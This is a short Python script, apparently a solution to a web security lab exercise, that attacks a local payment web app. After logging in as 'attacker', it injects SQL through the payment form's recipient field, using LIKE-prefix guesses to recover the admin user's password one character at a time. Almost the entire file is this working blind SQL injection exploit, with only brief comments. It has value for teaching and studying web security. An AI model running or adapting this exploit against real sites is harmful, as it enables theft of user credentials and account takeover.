from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    # You may need to include CSRF token from Exercise 1.5 in the POST request below 
    # SELECT * FROM users WHERE users.username='{}' LIMIT 1 OFFSET 0
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "csrf-token": sess.cookies.get_dict()['session'],

                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    print(sess.cookies.get_dict())
    print("sess id:"+str(sess.cookies.get_dict()['session']))

    pwd = ''
    i = 0
    '''
    i is also the fail count of trying each position in the pwd
    when i == 26, it means the pwd length can no longer increase
    hence, we should break out the while loop
    Construct pwd
    '''
    while i < 26:
        if submit_pay_form(sess, username + "' and users.password LIKE '" + pwd + chr(ord('a')+i) + "%' LIMIT 1 OFFSET 0--", 0):
            pwd += chr(ord('a') + i)
            # reset i
            i = 0    
        else:           
            i += 1
    print(pwd)
    return pwd

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
